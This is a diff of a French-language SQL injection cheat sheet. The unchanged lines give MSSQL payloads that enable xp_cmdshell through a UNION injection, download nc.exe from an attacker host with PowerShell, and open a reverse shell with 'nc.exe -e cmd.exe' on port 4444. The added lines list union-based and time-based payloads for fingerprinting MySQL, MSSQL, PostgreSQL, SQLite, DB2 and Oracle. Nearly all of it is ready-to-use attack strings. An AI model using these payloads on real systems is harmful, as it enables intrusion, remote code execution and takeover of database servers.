@@ -21,3 +21,18 @@ admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
 admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+  
 EXEC xp_cmdshell 'powershell.exe wget http://[IP]/nc.exe -OutFile c:\\Users\Public\\nc.exe'  
 EXEC xp_cmdshell 'c:\\Users\Public\\nc.exe -e cmd.exe [IP] 4444'  
+  
+### Detection de DB: 
+**Dtection de DB (Union select)**  
+select @@version; ==> db mysql ou mssql microsoft  
+select version(); ==> db postgress  
+select sql from sqlite_master; ==> db sqlite  
+select versionnumber from sysibm.sysversions; ==> db2 IBM  
+select version from v$instance; ==> db oracle  
+  
+**Detection de DB (Time Based)**  
+OR SLEEP(5) ==> db mysql  
+waitfor delay '00:00:05'​ ==> mssql microsoft  
+or pg_sleep(5) ==> db postgress  
+OR 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) ==> db sqlite  
+OR 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) ==> db Oracle  
